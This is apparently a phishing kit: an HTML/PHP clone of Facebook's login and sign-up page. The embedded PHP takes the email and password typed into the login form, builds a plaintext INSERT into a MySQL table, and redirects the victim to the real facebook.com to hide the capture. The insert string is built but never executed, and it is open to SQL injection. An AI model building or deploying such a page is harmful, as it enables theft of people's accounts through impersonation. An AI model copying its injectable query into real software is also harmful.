<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Facebook - log in or sign up</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,600,700,800&display=swap"
          rel="stylesheet">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/responsive.css">
</head>
<body>
<!--Start header part-->
<header class="header">
    <div class="container">
        <div class="logo-area">
            <img src="images/fb.png" alt="Facebook">
        </div>
        <div class="login-area">
            <form action="#" method="POST">
                <div class="email-or-phone">
                    <label for="em">Email or Phone</label>
                    <input type="text" id="email" name="email">
                </div>
                <div class="password">
                    <label for="pass">Password</label>
                    <input name="pass" type="password" id="pass">
                    <a href="#">Forgotten account?</a>
                </div>
                <div class="login">
                    <input type="submit" value="Log In">
                </div>
            </form>
        </div>
    </div>
</header>
<!--End header part-->
<?php
if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $servername = "localhost";
    $username = "username";
    $password = "password";
    $dbname = "facebook";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $sql = "INSERT INTO user (email, pass)
VALUES ('$email', '$pass')";

    $conn->close();
    header("Location: https://www.facebook.com/");
}
?>
<!--Start sign up part-->
<section class="sign-up-area">
    <div class="container">
        <div class="left-area">
            <div class="connect">
                <p>Facebook helps you connect and share with the people in your life.</p>
                <img src="images/connect.png" alt="People">
            </div>
        </div>
        <div class="right-area">
            <form action="#" method="POST">
                <h1>Create an account</h1>
                <h4>It's quick and easy.</h4>
                <div class="full-name">
                    <input type="text" placeholder="First Name">
                    <input type="text" placeholder="Surname">
                </div>
                <div class="mobile">
                    <input type="text" placeholder="Mobile number or email address">
                </div>

                <div class="pass">
                    <input type="password" placeholder="New Password">
                </div>
                <div class="birthday">
                    <h2>Birthday</h2>
                    <select>
                        <option value="Day">Day</option>
                        <option value="1">1</option>
                        <option value="2">2</option>
                        <option value="3">3</option>
                        <option value="4">4</option>
                        <option value="5">5</option>
                        <option value="6">6</option>
                        <option value="7" selected>7</option>
                        <option value="8">8</option>
                        <option value="9">9</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                        <option value="13">13</option>
                        <option value="14">14</option>
                        <option value="15">15</option>
                        <option value="16">16</option>
                    </select>
                    <select>
                        <option value="Month">Month</option>
                        <option value="Jan">Jan</option>
                        <option value="Feb">Feb</option>
                        <option value="Mar">Mar</option>
                        <option value="Apr">Apr</option>
                        <option value="May">May</option>
                        <option value="Jun">Jun</option>
                        <option value="Jul" selected>Jul</option>
                        <option value="Aug">Aug</option>
                        <option value="Sep">Sep</option>
                        <option value="Oct">Oct</option>
                        <option value="Nov">Nov</option>
                        <option value="Dec">Dec</option>
                    </select>
                    <select>
                        <option value="Year">Year</option>
                        <option value="2019">2019</option>
                        <option value="2018">2018</option>
                        <option value="2017">2017</option>
                        <option value="2016">2016</option>
                        <option value="2015">2015</option>
                        <option value="2014" selected>2014</option>
                        <option value="2013">2013</option>
                        <option value="2012">2012</option>
                        <option value="2011">2011</option>
                        <option value="2010">2010</option>
                        <option value="2009">2009</option>
                    </select>
                </div>
                <div class="gender">
                    <h2>Gender</h2>
                    <label for="female"></label>
                    <input type="radio" name="gender" id="female">Female
                    <label for="male"></label>
                    <input type="radio" name="gender" id="male">Male
                    <label for="custom"></label>
                    <input type="radio" name="gender" id="custom">Custom
                </div>
                <div class="topic">
                    <p>By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Data Policy</a> and <a
                                href="#">Cookie Policy</a>. You may receive SMS notifications from us and can opt out at
                        any time.</p>
                </div>
                <div class="sign">
                    <input type="submit" value="Sign Up">
                </div>
            </form>
        </div>
    </div>
</section>
<!--End sign up part-->

<!--Start footer part-->
<footer class="footer-part">
    <div class="container">
        <div class="top">
            <ul>
                <li class="en"><a href="#">English (UK)</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">অসমীয়া</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">नेपाली</a></li>
                <li><a href="#">Bahasa Indonesia</a></li>
                <li><a href="#">العربية</a></li>
                <li><a href="#">中文(简体)</a></li>
                <li><a href="#">Bahasa Melayu</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">+</a></li>
            </ul>
        </div>
        <hr class="hr">
        <div class="middle">
            <ul>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In</a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite </a></li>
                <li><a href="#"> Watch </a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Groups</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Fundraisers</a></li>
                <li><a href="#">Services</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Create ad</a></li>
                <li><a href="#">Create Page</a></li>
                <li><a href="#">Developers</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Privacy</a></li>
                <li><a href="#">Cookies</a></li>
                <li><a href="#">AdChoices</a></li>
                <li><a href="#">Terms</a></li>
                <li><a href="#">Help</a></li>
            </ul>
        </div>
        <div class="bottom">
            <span>Facebook &copy; 2019</span>
        </div>
    </div>
</footer>
<!--End footer part-->
</body>
</html>